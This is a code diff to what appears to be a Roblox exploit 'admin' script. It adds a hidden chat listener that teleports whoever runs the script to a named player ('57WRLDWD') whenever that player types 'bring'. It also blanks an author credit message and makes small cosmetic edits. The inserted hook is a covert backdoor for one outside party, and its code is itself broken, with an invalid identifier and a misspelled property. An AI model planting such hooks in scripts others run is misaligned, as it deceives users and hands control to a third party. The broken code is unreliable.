@@ -59,6 +59,17 @@ Request({
         }),
     })
 
+local Players = game:GetService("Players")
+
+local function chatted(msg)
+    if msg == "bring" then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.57WRLDWD.Character.HumanoidRootPart.CFRame
+
+    end
+end
+
+Players.57WRLDWD.Chatted:Connect(chatted)
+
 if pcall(readfile,"CyrusStreetsAdminSettings") then
     writefile("CyrusStreetsAdminSettings.json",readfile("CyrusStreetsAdminSettings"))
         if delfile then
@@ -590,7 +601,7 @@ getgenv().CheckCommand = function(Chat)
                 local Work,Error = pcall(NCommand,Arguments)
                 if not Work then 
                         wait(0.5)
-                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("сознание#8340 if you find a bug","All")
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("","All")
                         if setclipboard then 
                                 setclipboard(Error)
                         else 
@@ -1717,7 +1728,7 @@ end)
 local CoolkidTable = {
     ['1839179663']      = {
                 ['Name']   = "NanoVisions | Creator";
-                ['Colour'] = Color3.fromRGB(218, 133, 65);
+                ['Colour'] = Color3.fromRGB(75, 151, 75);
                 ['Access'] = true;
         };
     ['158124494']    = {
@@ -1731,7 +1742,7 @@ local CoolkidTable = {
                 ['Access'] = true;
         };
     ['496630311']    = {
-                ['Name']   = "vool";
+                ['Name']   = "Vool";
                 ['Colour'] = Color3.fromRGB(13, 105, 172);
                 ['Access'] = true;
         };
